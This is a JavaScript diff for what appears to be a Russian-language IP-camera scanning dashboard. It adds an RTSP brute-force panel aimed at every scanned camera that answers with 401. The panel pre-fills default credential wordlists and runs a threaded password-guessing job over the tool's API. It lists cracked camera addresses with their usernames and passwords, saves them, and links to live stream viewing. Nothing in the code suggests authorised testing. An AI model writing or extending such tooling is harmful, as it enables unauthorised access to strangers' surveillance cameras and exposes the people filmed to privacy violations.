@@ -110,6 +110,227 @@ function v2ExportJson() {
 }
 window.v2ExportJson = v2ExportJson;
 
+function v2Export401() {
+    window.open('/api/v2/export/401?format=txt', '_blank');
+}
+window.v2Export401 = v2Export401;
+
+// ── RTSP Brute Force Modal & Real-time Runner ───────────────────────
+let _v2BruterPollTimer = null;
+
+function v2OpenBruterModal() {
+    document.getElementById('v2-bruter-modal-overlay')?.remove();
+
+    const cameras401 = (window.V2State.results || []).filter(window._isCam401 || (c => c.auth_required));
+    const count401 = cameras401.length;
+
+    const overlay = document.createElement('div');
+    overlay.className = 'v2-modal-overlay';
+    overlay.id = 'v2-bruter-modal-overlay';
+    overlay.onclick = (e) => { if (e.target === overlay) v2CloseBruterModal(); };
+
+    const defaultUsers = 'admin\nroot\nservice\nuser\noperator\nviewer';
+    const defaultPass = '\nadmin\n12345\n123456\n12345678\nadmin123\nadmin12345\n12345admin\nroot\npass\npassword\nservice\n1111\n666666';
+
+    overlay.innerHTML = `
+        <div class="v2-modal-content" style="max-width:760px">
+            <div class="v2-modal-header">
+                <div class="v2-modal-title">
+                    <span>🔨</span>
+                    <span>RTSP Brute Force (/root/rtspBruter)</span>
+                </div>
+                <button class="v2-modal-close" onclick="v2CloseBruterModal()">✕</button>
+            </div>
+            <div class="v2-modal-body" style="padding:1.25rem;display:flex;flex-direction:column;gap:1rem;overflow-y:auto;max-height:calc(85vh - 70px);">
+                <!-- Target Summary -->
+                <div style="background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.35);padding:10px 14px;border-radius:8px;font-size:0.85rem;color:#fde68a;display:flex;align-items:center;justify-content:space-between">
+                    <div>
+                        <strong>🎯 Камеры для подбора:</strong>
+                        <span>${count401 > 0 ? `${count401} камер с 401 в результатах` : 'Все камеры с ошибкой 401 из базы'}</span>
+                    </div>
+                    <button class="v2-btn-small" onclick="v2Export401()" title="Скачать targets.txt для ручного запуска">⬇ Скачать targets.txt</button>
+                </div>
+
+                <!-- Wordlists and Settings -->
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+                    <div>
+                        <label style="display:block;font-size:0.75rem;font-weight:600;color:#94a3b8;margin-bottom:4px">Логины (один на строку):</label>
+                        <textarea id="v2-brute-users" style="width:100%;height:100px;background:#020617;border:1px solid rgba(255,255,255,0.12);border-radius:6px;color:#e2e8f0;font-size:0.75rem;font-family:monospace;padding:6px;resize:none">${defaultUsers}</textarea>
+                    </div>
+                    <div>
+                        <label style="display:block;font-size:0.75rem;font-weight:600;color:#94a3b8;margin-bottom:4px">Пароли (первая пустая = без пароля):</label>
+                        <textarea id="v2-brute-passwords" style="width:100%;height:100px;background:#020617;border:1px solid rgba(255,255,255,0.12);border-radius:6px;color:#e2e8f0;font-size:0.75rem;font-family:monospace;padding:6px;resize:none">${defaultPass}</textarea>
+                    </div>
+                </div>
+
+                <!-- Threads & Options -->
+                <div style="display:flex;align-items:center;gap:16px;font-size:0.8rem;color:#cbd5e1">
+                    <div style="display:flex;align-items:center;gap:8px">
+                        <span>Потоков (Threads):</span>
+                        <input type="number" id="v2-brute-threads" value="50" min="1" max="200" style="width:70px;background:#020617;border:1px solid rgba(255,255,255,0.12);color:#e2e8f0;padding:4px 8px;border-radius:4px;font-size:0.8rem">
+                    </div>
+                    <div style="color:rgba(255,255,255,0.45);font-size:0.75rem">
+                        ✓ При успехе пароль сохраняется в базу и автоматически захватывается превью!
+                    </div>
+                </div>
+
+                <!-- Action buttons -->
+                <div style="display:flex;align-items:center;gap:10px;margin-top:4px">
+                    <button class="v2-btn-small" id="v2-btn-start-brute" style="background:linear-gradient(135deg, #10b981, #059669);color:#fff;font-weight:600;padding:6px 14px" onclick="v2StartBruter()">▶ Запустить брутфорс</button>
+                    <button class="v2-btn-small v2-btn-danger" id="v2-btn-stop-brute" style="display:none;padding:6px 14px" onclick="v2StopBruter()">⏹ Остановить</button>
+                    <span id="v2-brute-status-indicator" style="font-size:0.8rem;color:#94a3b8;margin-left:auto">Готов к запуску</span>
+                </div>
+
+                <!-- Terminal / Console Log -->
+                <div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:4px">
+                        <span style="font-size:0.75rem;font-weight:600;color:#94a3b8">Лог работы rtspBrute:</span>
+                        <span id="v2-brute-cracked-stats" style="font-size:0.75rem;color:#4ade80;font-weight:600">✓ Подобрано: 0</span>
+                    </div>
+                    <div class="v2-bruter-console" id="v2-bruter-log">Ожидание запуска задачи...</div>
+                </div>
+
+                <!-- Cracked cameras list -->
+                <div id="v2-bruter-cracked-section" style="display:none">
+                    <div style="font-size:0.75rem;font-weight:700;color:#4ade80;margin-bottom:6px">Успешно подобраны пароли:</div>
+                    <div id="v2-bruter-cracked-list" style="display:flex;flex-direction:column;gap:6px;max-height:140px;overflow-y:auto"></div>
+                </div>
+            </div>
+        </div>
+    `;
+
+    document.body.appendChild(overlay);
+    v2CheckBruterStatusOnOpen();
+}
+window.v2OpenBruterModal = v2OpenBruterModal;
+
+function v2CloseBruterModal() {
+    if (_v2BruterPollTimer) {
+        clearInterval(_v2BruterPollTimer);
+        _v2BruterPollTimer = null;
+    }
+    document.getElementById('v2-bruter-modal-overlay')?.remove();
+}
+window.v2CloseBruterModal = v2CloseBruterModal;
+
+async function v2CheckBruterStatusOnOpen() {
+    try {
+        const resp = await fetch('/api/v2/bruter/status');
+        if (!resp.ok) return;
+        const data = await resp.json();
+        v2UpdateBruterUI(data);
+        if (data.is_running) {
+            _v2StartBruterPolling();
+        }
+    } catch (e) {}
+}
+
+function _v2StartBruterPolling() {
+    if (_v2BruterPollTimer) clearInterval(_v2BruterPollTimer);
+    _v2BruterPollTimer = setInterval(async () => {
+        try {
+            const resp = await fetch('/api/v2/bruter/status');
+            if (!resp.ok) return;
+            const data = await resp.json();
+            v2UpdateBruterUI(data);
+            if (!data.is_running) {
+                clearInterval(_v2BruterPollTimer);
+                _v2BruterPollTimer = null;
+                // Reload stored results to show updated cracked cameras
+                if (window.v2LoadStoredResults) v2LoadStoredResults(true);
+            }
+        } catch (e) {}
+    }, 1500);
+}
+
+function v2UpdateBruterUI(data) {
+    const startBtn = document.getElementById('v2-btn-start-brute');
+    const stopBtn = document.getElementById('v2-btn-stop-brute');
+    const indicator = document.getElementById('v2-brute-status-indicator');
+    const logBox = document.getElementById('v2-bruter-log');
+    const crackedStats = document.getElementById('v2-brute-cracked-stats');
+    const crackedSec = document.getElementById('v2-bruter-cracked-section');
+    const crackedList = document.getElementById('v2-bruter-cracked-list');
+
+    if (startBtn && stopBtn) {
+        startBtn.style.display = data.is_running ? 'none' : 'inline-block';
+        stopBtn.style.display = data.is_running ? 'inline-block' : 'none';
+    }
+
+    if (indicator) {
+        if (data.is_running) {
+            indicator.innerHTML = `<span style="color:#34d399;font-weight:600">⚡ Выполняется... (${data.elapsed_seconds || 0}с, целей: ${data.total_targets})</span>`;
+        } else if (data.status === 'finished') {
+            indicator.innerHTML = `<span style="color:#4ade80;font-weight:600">✓ Завершено (Взломано: ${data.cracked_count})</span>`;
+        } else if (data.status === 'stopped') {
+            indicator.innerHTML = `<span style="color:#f87171">⏹ Остановлено</span>`;
+        } else if (data.status === 'error') {
+            indicator.innerHTML = `<span style="color:#f87171">⚠️ Ошибка: ${_esc(data.error || 'unknown')}</span>`;
+        }
+    }
+
+    if (crackedStats) {
+        crackedStats.textContent = `✓ Подобрано: ${data.cracked_count || 0}`;
+    }
+
+    if (logBox && data.logs && data.logs.length) {
+        logBox.textContent = data.logs.join('\n');
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    if (crackedSec && crackedList && data.cracked_cameras && data.cracked_cameras.length) {
+        crackedSec.style.display = 'block';
+        crackedList.innerHTML = data.cracked_cameras.map(c => `
+            <div style="background:rgba(16,185,129,0.15);border:1px solid rgba(16,185,129,0.3);padding:6px 10px;border-radius:6px;display:flex;align-items:center;justify-content:space-between;font-size:0.75rem">
+                <div>
+                    <strong style="color:#e2e8f0">${_esc(c.ip)}:${c.port}</strong>
+                    <span style="color:#34d399;margin-left:8px;font-weight:600">🔑 ${_esc(c.user || 'none')}:${_esc(c.password || '')}</span>
+                </div>
+                <button class="v2-btn-small" onclick="v2CloseBruterModal();v2OpenSelectedStreamPlayer('${_esc(c.ip)}')" style="padding:2px 8px;font-size:0.7rem">▶ Просмотр</button>
+            </div>
+        `).join('');
+    }
+}
+
+async function v2StartBruter() {
+    const usersTxt = document.getElementById('v2-brute-users')?.value || '';
+    const passTxt = document.getElementById('v2-brute-passwords')?.value || '';
+    const threads = parseInt(document.getElementById('v2-brute-threads')?.value || '50', 10);
+
+    const usernames = usersTxt.split('\n').map(u => u.trim()).filter(Boolean);
+    const passwords = passTxt.split('\n');
+
+    try {
+        const resp = await fetch('/api/v2/bruter/start', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                usernames: usernames,
+                passwords: passwords,
+                threads: threads,
+            }),
+        });
+        const data = await resp.json();
+        if (data.started) {
+            _showV2Toast(`Запущен подбор паролей для ${data.total_targets} камер!`);
+            _v2StartBruterPolling();
+        } else {
+            alert(data.message || 'Не удалось запустить брутфорс');
+        }
+    } catch (e) {
+        alert('Ошибка запуска: ' + e.message);
+    }
+}
+window.v2StartBruter = v2StartBruter;
+
+async function v2StopBruter() {
+    try {
+        await fetch('/api/v2/bruter/stop', { method: 'POST' });
+        _showV2Toast('Остановка процесса брутфорса...');
+    } catch (e) {}
+}
+window.v2StopBruter = v2StopBruter;
+
 async function v2ClearResults() {
     if (!confirm('Удалить все результаты v2 из базы данных?')) return;
     await fetch('/api/v2/results', { method: 'DELETE' });
@@ -224,7 +445,7 @@ async function v2StartBulkCapture(btn) {
             body: JSON.stringify({
                 concurrency: 2,
                 only_unverified: true,
-                max_streams_per_cam: 4,
+                max_streams_per_cam: 0,
             })
         });
         const data = await resp.json();
@@ -352,13 +573,22 @@ function v2SetFilter(type, value) {
         const activeVal = window.V2State.filterStatus;
         document.getElementById('v2-filter-status-live')?.classList.toggle('active', activeVal === 'live');
         document.getElementById('v2-filter-status-preview')?.classList.toggle('active', activeVal === 'preview');
+    } else if (type === 'auth') {
+        const cur = window.V2State.filterAuth || 'all';
+        window.V2State.filterAuth = (cur === value) ? 'all' : value;
+        const activeVal = window.V2State.filterAuth;
+        document.getElementById('v2-filter-auth-open')?.classList.toggle('active', activeVal === 'open');
+        document.getElementById('v2-filter-auth-401')?.classList.toggle('active', activeVal === '401');
     } else if (type === 'brand') {
         window.V2State.filterBrand = value;
         if (value === 'all') {
             window.V2State.filterProtocol = 'all';
             window.V2State.filterStatus = 'all';
+            window.V2State.filterAuth = 'all';
             document.querySelectorAll('.v2-filter-btn').forEach(btn => btn.classList.remove('active'));
             document.getElementById('v2-filter-brand-all')?.classList.add('active');
+            document.getElementById('v2-filter-auth-open')?.classList.remove('active');
+            document.getElementById('v2-filter-auth-401')?.classList.remove('active');
         } else {
             document.querySelectorAll('.v2-filter-btn[id^="v2-filter-brand-"]').forEach(btn => {
                 btn.classList.toggle('active', btn.dataset.value === value);
@@ -373,7 +603,8 @@ function v2SetFilter(type, value) {
 
     const isAll = window.V2State.filterBrand === 'all' &&
                   window.V2State.filterProtocol === 'all' &&
-                  (!window.V2State.filterStatus || window.V2State.filterStatus === 'all');
+                  (!window.V2State.filterStatus || window.V2State.filterStatus === 'all') &&
+                  (!window.V2State.filterAuth || window.V2State.filterAuth === 'all');
     document.getElementById('v2-filter-brand-all')?.classList.toggle('active', isAll);
 
     if (window.v2RenderResults) v2RenderResults();
